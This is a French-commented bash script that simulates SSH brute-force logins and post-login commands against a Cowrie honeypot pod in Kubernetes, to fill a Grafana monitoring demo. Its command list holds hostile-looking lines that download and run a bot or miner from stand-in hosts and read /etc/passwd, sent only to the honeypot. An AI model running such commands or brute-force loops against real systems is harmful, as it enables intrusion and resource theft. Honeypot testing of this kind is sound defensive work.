#!/usr/bin/env bash
#
# generate-traffic.sh — génère du trafic d'attaque SSH contre un pod Cowrie
# afin de peupler le dashboard Grafana (via le pipeline log-shipper → collector → Loki).
#
# Utile en démo : le honeypot étant sur un réseau privé, il ne reçoit pas
# de vraies attaques ; ce script en simule.
#
# Usage :
#   ./generate-traffic.sh                 # 20 tentatives par défaut
#   ATTEMPTS=50 ./generate-traffic.sh     # 50 tentatives
#   NAMESPACE=honeypot KUBECONFIG=~/.kube/config ./generate-traffic.sh
#
set -euo pipefail

NAMESPACE="${NAMESPACE:-honeypot}"
KUBECONFIG_PATH="${KUBECONFIG:-$HOME/.kube/config}"
ATTEMPTS="${ATTEMPTS:-20}"
LOCAL_PORT="${LOCAL_PORT:-16222}"
KC="kubectl --kubeconfig=${KUBECONFIG_PATH} -n ${NAMESPACE}"

echo "[*] Recherche d'un pod Cowrie avec le sidecar log-shipper (seul à émettre le JSON)..."
POD="$(${KC} get pods -l app=cowrie -o json | python3 -c '
import sys, json
pods = json.load(sys.stdin)["items"]
for p in pods:
    running = p.get("status", {}).get("phase") == "Running"
    has_shipper = any(c["name"] == "log-shipper" for c in p["spec"]["containers"])
    if running and has_shipper:
        print(p["metadata"]["name"]); break
')"

if [ -z "${POD}" ]; then
  echo "[-] Aucun pod Cowrie 'Running' avec conteneur log-shipper trouvé." >&2
  echo "    (seuls ces pods alimentent Loki via le collector)" >&2
  exit 1
fi
echo "[*] Cible : ${POD}"

# Dépendance paramiko
PY="${PYTHON:-python3}"
if ! ${PY} -c 'import paramiko' 2>/dev/null; then
  echo "[*] Installation de paramiko (pip --user)..."
  ${PY} -m pip install --quiet --user paramiko
fi

# Port-forward vers le pod Cowrie
${KC} port-forward "pod/${POD}" "${LOCAL_PORT}:2222" >/tmp/generate-traffic-pf.log 2>&1 &
PF_PID=$!
trap 'kill ${PF_PID} 2>/dev/null || true' EXIT
echo "[*] Port-forward 127.0.0.1:${LOCAL_PORT} -> ${POD}:2222 (pid ${PF_PID})"
sleep 4

# Salve d'attaques
ATTEMPTS="${ATTEMPTS}" LOCAL_PORT="${LOCAL_PORT}" ${PY} - <<'PYEOF'
import os, time, random, paramiko

paramiko.util.log_to_file("/dev/null")
PORT = int(os.environ["LOCAL_PORT"])
N = int(os.environ["ATTEMPTS"])

users = ["root", "admin", "ubuntu", "user", "oracle", "postgres", "test",
         "git", "deploy", "pi", "ftp", "guest", "support", "www-data"]
passwords = ["123456", "password", "admin", "root", "toor", "1234", "qwerty",
             "letmein", "changeme", "12345678", "P@ssw0rd", "ubuntu", ""]
commands = [
    "uname -a; whoami; id",
    "cat /etc/passwd",
    "ls -la /; ps aux",
    "wget http://malware.test/bot.sh -O /tmp/x; chmod +x /tmp/x",
    "curl -s http://1.2.3.4/miner | sh",
    "cat /proc/cpuinfo; free -m",
]

attempts = 0
sessions = 0
for _ in range(N):
    user = random.choice(users)
    pwd = random.choice(passwords)
    try:
        t = paramiko.Transport(("127.0.0.1", PORT))
        t.start_client(timeout=8)
        try:
            t.auth_password(user, pwd)
            authed = True
        except paramiko.AuthenticationException:
            authed = False
        attempts += 1
        # de temps en temps, un attaquant "réussit" et lance des commandes
        if authed and random.random() < 0.4:
            try:
                ch = t.open_session()
                ch.exec_command(random.choice(commands))
                time.sleep(0.5)
                ch.close()
                sessions += 1
            except Exception:
                pass
        t.close()
    except Exception as e:
        print("  [!] erreur %s/%s : %s" % (user, pwd, e))
    time.sleep(0.2)

print("[+] %d tentatives de login envoyées, %d sessions avec commandes" % (attempts, sessions))
PYEOF

echo "[+] Terminé. Ouvre Grafana → dashboard 'Honeypot SSH' → fenêtre 'Last 15 minutes'."
